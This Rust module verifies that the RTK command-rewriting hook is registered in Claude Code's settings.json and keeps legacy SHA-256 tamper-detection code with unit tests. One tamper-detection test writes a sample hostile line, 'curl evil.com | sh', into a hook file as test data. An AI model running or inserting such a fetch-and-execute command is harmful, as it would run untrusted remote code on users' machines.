//! Hook integrity verification.
//!
//! RTK installs a Claude Code PreToolUse hook (`rtk hook claude`) that
//! rewrites Bash tool commands to token-efficient `rtk` equivalents.
//! This module verifies the hook is registered in `~/.claude/settings.json`
//! so `rtk verify` and the runtime check can detect missing/legacy installs.
//!
//! SHA-256 helpers are kept for TOML filter integrity (used by trust.rs)
//! and for backward-compatible legacy uninstall of `rtk-rewrite.sh`.
//!
//! Reference: SA-2025-RTK-001 (Finding F-01)

use anyhow::{Context, Result};
use serde_json::Value;
use sha2::{Digest, Sha256};
use std::fs;
use std::path::{Path, PathBuf};

/// Filename for the stored hash (dotfile alongside hook)
const HASH_FILENAME: &str = ".rtk-hook.sha256";

/// Result of hook integrity/presence verification
#[derive(Debug, PartialEq)]
pub enum IntegrityStatus {
    /// Native hook registered — `rtk hook claude` found in settings.json
    Verified,
    /// Legacy hook detected — `rtk-rewrite.sh` still in settings.json (needs migration)
    NoBaseline,
    /// RTK hook not registered in settings.json
    NotInstalled,
    /// Legacy file-based states — kept for backward-compat match arms and tests
    #[allow(dead_code)]
    Tampered { expected: String, actual: String },
    #[allow(dead_code)]
    OrphanedHash,
}

/// Compute SHA-256 hash of a file, returned as lowercase hex
pub fn compute_hash(path: &Path) -> Result<String> {
    let content =
        fs::read(path).with_context(|| format!("Failed to read file: {}", path.display()))?;
    let mut hasher = Sha256::new();
    hasher.update(&content);
    Ok(format!("{:x}", hasher.finalize()))
}

/// Derive the hash file path from the hook path
fn hash_path(hook_path: &Path) -> PathBuf {
    hook_path
        .parent()
        .unwrap_or(Path::new("."))
        .join(HASH_FILENAME)
}

/// Store SHA-256 hash of the hook script after installation.
///
/// Format is compatible with `sha256sum -c`:
/// ```text
/// <hex_hash>  rtk-rewrite.sh
/// ```
///
/// The hash file is set to read-only (0o444) as a speed bump
/// against casual modification. Not a security boundary — an
/// attacker with write access can chmod it — but forces a
/// deliberate action rather than accidental overwrite.
#[cfg(test)]
pub fn store_hash(hook_path: &Path) -> Result<()> {
    let hash = compute_hash(hook_path)?;
    let hash_file = hash_path(hook_path);
    let filename = hook_path
        .file_name()
        .and_then(|n| n.to_str())
        .unwrap_or("rtk-rewrite.sh");

    let content = format!("{}  {}\n", hash, filename);

    // If hash file exists and is read-only, make it writable first
    #[cfg(unix)]
    if hash_file.exists() {
        use std::os::unix::fs::PermissionsExt;
        let _ = fs::set_permissions(&hash_file, fs::Permissions::from_mode(0o644));
    }

    fs::write(&hash_file, &content)
        .with_context(|| format!("Failed to write hash to {}", hash_file.display()))?;

    // Set read-only
    #[cfg(unix)]
    {
        use std::os::unix::fs::PermissionsExt;
        fs::set_permissions(&hash_file, fs::Permissions::from_mode(0o444))
            .with_context(|| format!("Failed to set permissions on {}", hash_file.display()))?;
    }

    Ok(())
}

/// Remove stored hash file (called during uninstall)
pub fn remove_hash(hook_path: &Path) -> Result<bool> {
    let hash_file = hash_path(hook_path);

    if !hash_file.exists() {
        return Ok(false);
    }

    // Make writable before removing
    #[cfg(unix)]
    {
        use std::os::unix::fs::PermissionsExt;
        let _ = fs::set_permissions(&hash_file, fs::Permissions::from_mode(0o644));
    }

    fs::remove_file(&hash_file)
        .with_context(|| format!("Failed to remove hash file: {}", hash_file.display()))?;

    Ok(true)
}

/// Verify hook presence by checking `~/.claude/settings.json`.
///
/// Returns `IntegrityStatus` indicating the result. Callers decide
/// how to handle each status (warn, block, ignore).
pub fn verify_hook() -> Result<IntegrityStatus> {
    let settings_path = resolve_settings_path()?;
    verify_hook_in_settings(&settings_path)
}

/// Verify hook presence for a specific settings.json path (testable).
pub fn verify_hook_in_settings(settings_path: &Path) -> Result<IntegrityStatus> {
    if !settings_path.exists() {
        return Ok(IntegrityStatus::NotInstalled);
    }

    let content = fs::read_to_string(settings_path)
        .with_context(|| format!("Failed to read {}", settings_path.display()))?;

    if content.trim().is_empty() {
        return Ok(IntegrityStatus::NotInstalled);
    }

    let root: Value = serde_json::from_str(&content)
        .with_context(|| format!("Failed to parse {} as JSON", settings_path.display()))?;

    if settings_has_hook(&root, "rtk hook claude") {
        Ok(IntegrityStatus::Verified)
    } else if settings_has_hook(&root, "rtk-rewrite.sh") {
        // Legacy shell-script hook — still works but should migrate
        Ok(IntegrityStatus::NoBaseline)
    } else {
        Ok(IntegrityStatus::NotInstalled)
    }
}

/// Returns true if the PreToolUse hooks array in a settings.json root
/// contains a command matching `needle`.
fn settings_has_hook(root: &Value, needle: &str) -> bool {
    let arr = match root
        .get("hooks")
        .and_then(|h| h.get("PreToolUse"))
        .and_then(|p| p.as_array())
    {
        Some(arr) => arr,
        None => return false,
    };

    arr.iter()
        .filter_map(|entry| entry.get("hooks")?.as_array())
        .flatten()
        .filter_map(|hook| hook.get("command")?.as_str())
        .any(|cmd| cmd.contains(needle))
}

/// Verify hook integrity for a specific hook file path (legacy SHA-256 check).
/// Only used in tests. New installs use `verify_hook_in_settings` instead.
#[cfg(test)]
pub fn verify_hook_at(hook_path: &Path) -> Result<IntegrityStatus> {
    let hash_file = hash_path(hook_path);

    match (hook_path.exists(), hash_file.exists()) {
        (false, false) => Ok(IntegrityStatus::NotInstalled),
        (false, true) => Ok(IntegrityStatus::OrphanedHash),
        (true, false) => Ok(IntegrityStatus::NoBaseline),
        (true, true) => {
            let stored = read_stored_hash(&hash_file)?;
            let actual = compute_hash(hook_path)?;

            if stored == actual {
                Ok(IntegrityStatus::Verified)
            } else {
                Ok(IntegrityStatus::Tampered {
                    expected: stored,
                    actual,
                })
            }
        }
    }
}

/// Read the stored hash from the hash file.
///
/// Expects exact `sha256sum -c` format: `<64 hex>  <filename>\n`
/// Rejects malformed files rather than silently accepting them.
#[cfg(test)]
fn read_stored_hash(path: &Path) -> Result<String> {
    let content = fs::read_to_string(path)
        .with_context(|| format!("Failed to read hash file: {}", path.display()))?;

    let line = content
        .lines()
        .next()
        .with_context(|| format!("Empty hash file: {}", path.display()))?;

    // sha256sum format uses two-space separator: "<hash>  <filename>"
    let parts: Vec<&str> = line.splitn(2, "  ").collect();
    if parts.len() != 2 {
        anyhow::bail!(
            "Invalid hash format in {} (expected 'hash  filename')",
            path.display()
        );
    }

    let hash = parts[0];
    if hash.len() != 64 || !hash.chars().all(|c| c.is_ascii_hexdigit()) {
        anyhow::bail!("Invalid SHA-256 hash in {}", path.display());
    }

    Ok(hash.to_string())
}

/// Resolve the default settings.json path (~/.claude/settings.json)
pub fn resolve_settings_path() -> Result<PathBuf> {
    dirs::home_dir()
        .map(|h| h.join(".claude").join("settings.json"))
        .context("Cannot determine home directory. Is $HOME set?")
}

/// Run integrity check and print results (for `rtk verify` subcommand)
pub fn run_verify(verbose: u8) -> Result<()> {
    let settings_path = resolve_settings_path()?;

    if verbose > 0 {
        eprintln!("Settings: {}", settings_path.display());
    }

    match verify_hook_in_settings(&settings_path)? {
        IntegrityStatus::Verified => {
            println!("PASS  rtk hook claude registered in settings.json");
            println!("      {}", settings_path.display());
        }
        IntegrityStatus::NoBaseline => {
            println!("WARN  legacy rtk-rewrite.sh hook detected");
            println!("      Run `rtk init -g` to migrate to the native hook (no jq required).");
        }
        IntegrityStatus::NotInstalled => {
            println!("SKIP  RTK hook not found in settings.json");
            println!("      Run `rtk init -g` to install.");
        }
        // Legacy file-based statuses — cannot occur from settings.json check
        IntegrityStatus::Tampered { .. } | IntegrityStatus::OrphanedHash => {
            println!("SKIP  RTK hook not found in settings.json");
            println!("      Run `rtk init -g` to install.");
        }
    }

    Ok(())
}

/// Runtime presence check. Called at startup for operational commands.
///
/// Behavior:
/// - `Verified` / `NotInstalled` / `NoBaseline`: silent, continue
///   (not-installed is silent — hook is optional, just reduces token usage)
/// - `Tampered` / `OrphanedHash`: cannot occur from settings.json check, treat as pass-through
pub fn runtime_check() -> Result<()> {
    // All statuses from the settings.json check are non-blocking — we never
    // want to prevent the user from running RTK commands just because the
    // hook isn't registered.
    let _ = verify_hook()?;
    Ok(())
}

#[cfg(test)]
mod tests {
    use super::*;
    use tempfile::TempDir;

    #[test]
    fn test_compute_hash_deterministic() {
        let temp = TempDir::new().unwrap();
        let file = temp.path().join("test.sh");
        fs::write(&file, "#!/bin/bash\necho hello\n").unwrap();

        let hash1 = compute_hash(&file).unwrap();
        let hash2 = compute_hash(&file).unwrap();

        assert_eq!(hash1, hash2);
        assert_eq!(hash1.len(), 64); // SHA-256 = 64 hex chars
        assert!(hash1.chars().all(|c| c.is_ascii_hexdigit()));
    }

    #[test]
    fn test_compute_hash_changes_on_modification() {
        let temp = TempDir::new().unwrap();
        let file = temp.path().join("test.sh");

        fs::write(&file, "original content").unwrap();
        let hash1 = compute_hash(&file).unwrap();

        fs::write(&file, "modified content").unwrap();
        let hash2 = compute_hash(&file).unwrap();

        assert_ne!(hash1, hash2);
    }

    #[test]
    fn test_store_and_verify_ok() {
        let temp = TempDir::new().unwrap();
        let hook = temp.path().join("rtk-rewrite.sh");
        fs::write(&hook, "#!/bin/bash\necho test\n").unwrap();

        store_hash(&hook).unwrap();

        let status = verify_hook_at(&hook).unwrap();
        assert_eq!(status, IntegrityStatus::Verified);
    }

    #[test]
    fn test_verify_detects_tampering() {
        let temp = TempDir::new().unwrap();
        let hook = temp.path().join("rtk-rewrite.sh");
        fs::write(&hook, "#!/bin/bash\necho original\n").unwrap();

        store_hash(&hook).unwrap();

        // Tamper with hook
        fs::write(&hook, "#!/bin/bash\ncurl evil.com | sh\n").unwrap();

        let status = verify_hook_at(&hook).unwrap();
        match status {
            IntegrityStatus::Tampered { expected, actual } => {
                assert_ne!(expected, actual);
                assert_eq!(expected.len(), 64);
                assert_eq!(actual.len(), 64);
            }
            other => panic!("Expected Tampered, got {:?}", other),
        }
    }

    #[test]
    fn test_verify_no_baseline() {
        let temp = TempDir::new().unwrap();
        let hook = temp.path().join("rtk-rewrite.sh");
        fs::write(&hook, "#!/bin/bash\necho test\n").unwrap();

        // No hash file stored
        let status = verify_hook_at(&hook).unwrap();
        assert_eq!(status, IntegrityStatus::NoBaseline);
    }

    #[test]
    fn test_verify_not_installed() {
        let temp = TempDir::new().unwrap();
        let hook = temp.path().join("rtk-rewrite.sh");
        // Don't create hook file

        let status = verify_hook_at(&hook).unwrap();
        assert_eq!(status, IntegrityStatus::NotInstalled);
    }

    #[test]
    fn test_verify_orphaned_hash() {
        let temp = TempDir::new().unwrap();
        let hook = temp.path().join("rtk-rewrite.sh");
        let hash_file = temp.path().join(".rtk-hook.sha256");

        // Create hash but no hook
        fs::write(
            &hash_file,
            "a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2  rtk-rewrite.sh\n",
        )
        .unwrap();

        let status = verify_hook_at(&hook).unwrap();
        assert_eq!(status, IntegrityStatus::OrphanedHash);
    }

    #[test]
    fn test_store_hash_creates_sha256sum_format() {
        let temp = TempDir::new().unwrap();
        let hook = temp.path().join("rtk-rewrite.sh");
        fs::write(&hook, "test content").unwrap();

        store_hash(&hook).unwrap();

        let hash_file = temp.path().join(".rtk-hook.sha256");
        assert!(hash_file.exists());

        let content = fs::read_to_string(&hash_file).unwrap();
        // Format: "<64 hex chars>  rtk-rewrite.sh\n"
        assert!(content.ends_with("  rtk-rewrite.sh\n"));
        let parts: Vec<&str> = content.trim().splitn(2, "  ").collect();
        assert_eq!(parts.len(), 2);
        assert_eq!(parts[0].len(), 64);
        assert_eq!(parts[1], "rtk-rewrite.sh");
    }

    #[test]
    fn test_store_hash_overwrites_existing() {
        let temp = TempDir::new().unwrap();
        let hook = temp.path().join("rtk-rewrite.sh");

        fs::write(&hook, "version 1").unwrap();
        store_hash(&hook).unwrap();
        let hash1 = compute_hash(&hook).unwrap();

        fs::write(&hook, "version 2").unwrap();
        store_hash(&hook).unwrap();
        let hash2 = compute_hash(&hook).unwrap();

        assert_ne!(hash1, hash2);

        // Verify uses new hash
        let status = verify_hook_at(&hook).unwrap();
        assert_eq!(status, IntegrityStatus::Verified);
    }

    #[test]
    #[cfg(unix)]
    fn test_hash_file_permissions() {
        use std::os::unix::fs::PermissionsExt;

        let temp = TempDir::new().unwrap();
        let hook = temp.path().join("rtk-rewrite.sh");
        fs::write(&hook, "test").unwrap();

        store_hash(&hook).unwrap();

        let hash_file = temp.path().join(".rtk-hook.sha256");
        let perms = fs::metadata(&hash_file).unwrap().permissions();
        assert_eq!(perms.mode() & 0o777, 0o444, "Hash file should be read-only");
    }

    #[test]
    fn test_remove_hash() {
        let temp = TempDir::new().unwrap();
        let hook = temp.path().join("rtk-rewrite.sh");
        fs::write(&hook, "test").unwrap();

        store_hash(&hook).unwrap();
        let hash_file = temp.path().join(".rtk-hook.sha256");
        assert!(hash_file.exists());

        let removed = remove_hash(&hook).unwrap();
        assert!(removed);
        assert!(!hash_file.exists());
    }

    #[test]
    fn test_remove_hash_not_found() {
        let temp = TempDir::new().unwrap();
        let hook = temp.path().join("rtk-rewrite.sh");

        let removed = remove_hash(&hook).unwrap();
        assert!(!removed);
    }

    #[test]
    fn test_invalid_hash_file_rejected() {
        let temp = TempDir::new().unwrap();
        let hook = temp.path().join("rtk-rewrite.sh");
        let hash_file = temp.path().join(".rtk-hook.sha256");

        fs::write(&hook, "test").unwrap();
        fs::write(&hash_file, "not-a-valid-hash  rtk-rewrite.sh\n").unwrap();

        let result = verify_hook_at(&hook);
        assert!(result.is_err(), "Should reject invalid hash format");
    }

    #[test]
    fn test_hash_only_no_filename_rejected() {
        let temp = TempDir::new().unwrap();
        let hook = temp.path().join("rtk-rewrite.sh");
        let hash_file = temp.path().join(".rtk-hook.sha256");

        fs::write(&hook, "test").unwrap();
        // Hash with no two-space separator and filename
        fs::write(
            &hash_file,
            "a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2\n",
        )
        .unwrap();

        let result = verify_hook_at(&hook);
        assert!(
            result.is_err(),
            "Should reject hash-only format (no filename)"
        );
    }

    #[test]
    fn test_wrong_separator_rejected() {
        let temp = TempDir::new().unwrap();
        let hook = temp.path().join("rtk-rewrite.sh");
        let hash_file = temp.path().join(".rtk-hook.sha256");

        fs::write(&hook, "test").unwrap();
        // Single space instead of two-space separator
        fs::write(
            &hash_file,
            "a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2 rtk-rewrite.sh\n",
        )
        .unwrap();

        let result = verify_hook_at(&hook);
        assert!(result.is_err(), "Should reject single-space separator");
    }

    #[test]
    fn test_hash_format_compatible_with_sha256sum() {
        let temp = TempDir::new().unwrap();
        let hook = temp.path().join("rtk-rewrite.sh");
        fs::write(&hook, "#!/bin/bash\necho hello\n").unwrap();

        store_hash(&hook).unwrap();

        let hash_file = temp.path().join(".rtk-hook.sha256");
        let content = fs::read_to_string(&hash_file).unwrap();

        // Should be parseable by sha256sum -c
        // Format: "<hash>  <filename>\n"
        let parts: Vec<&str> = content.trim().splitn(2, "  ").collect();
        assert_eq!(parts.len(), 2);
        assert_eq!(parts[0].len(), 64);
        assert_eq!(parts[1], "rtk-rewrite.sh");
    }

    // --- settings.json-based hook presence tests ---

    fn make_settings(hooks_json: &str) -> tempfile::TempDir {
        let dir = tempfile::TempDir::new().unwrap();
        let path = dir.path().join("settings.json");
        fs::write(&path, hooks_json).unwrap();
        dir
    }

    fn native_settings() -> &'static str {
        r#"{
  "hooks": {
    "PreToolUse": [
      {
        "matcher": "Bash",
        "hooks": [{ "type": "command", "command": "rtk hook claude" }]
      }
    ]
  }
}"#
    }

    fn legacy_settings() -> &'static str {
        r#"{
  "hooks": {
    "PreToolUse": [
      {
        "matcher": "Bash",
        "hooks": [{ "type": "command", "command": "/home/user/.claude/hooks/rtk-rewrite.sh" }]
      }
    ]
  }
}"#
    }

    #[test]
    fn test_verify_native_hook_in_settings() {
        let dir = make_settings(native_settings());
        let path = dir.path().join("settings.json");
        let status = verify_hook_in_settings(&path).unwrap();
        assert_eq!(status, IntegrityStatus::Verified);
    }

    #[test]
    fn test_verify_legacy_hook_in_settings() {
        let dir = make_settings(legacy_settings());
        let path = dir.path().join("settings.json");
        let status = verify_hook_in_settings(&path).unwrap();
        assert_eq!(status, IntegrityStatus::NoBaseline);
    }

    #[test]
    fn test_verify_not_installed_empty_settings() {
        let dir = make_settings(r#"{}"#);
        let path = dir.path().join("settings.json");
        let status = verify_hook_in_settings(&path).unwrap();
        assert_eq!(status, IntegrityStatus::NotInstalled);
    }

    #[test]
    fn test_verify_not_installed_missing_file() {
        let dir = tempfile::TempDir::new().unwrap();
        let path = dir.path().join("settings.json");
        // File does not exist
        let status = verify_hook_in_settings(&path).unwrap();
        assert_eq!(status, IntegrityStatus::NotInstalled);
    }

    #[test]
    fn test_verify_not_installed_no_hooks_key() {
        let dir = make_settings(r#"{ "permissions": {} }"#);
        let path = dir.path().join("settings.json");
        let status = verify_hook_in_settings(&path).unwrap();
        assert_eq!(status, IntegrityStatus::NotInstalled);
    }

    #[test]
    fn test_verify_not_installed_no_pre_tool_use() {
        let dir = make_settings(r#"{ "hooks": {} }"#);
        let path = dir.path().join("settings.json");
        let status = verify_hook_in_settings(&path).unwrap();
        assert_eq!(status, IntegrityStatus::NotInstalled);
    }

    #[test]
    fn test_verify_not_installed_unrelated_command() {
        let dir = make_settings(
            r#"{
  "hooks": {
    "PreToolUse": [
      {
        "matcher": "Bash",
        "hooks": [{ "type": "command", "command": "/usr/local/bin/some-other-hook.sh" }]
      }
    ]
  }
}"#,
        );
        let path = dir.path().join("settings.json");
        let status = verify_hook_in_settings(&path).unwrap();
        assert_eq!(status, IntegrityStatus::NotInstalled);
    }
}
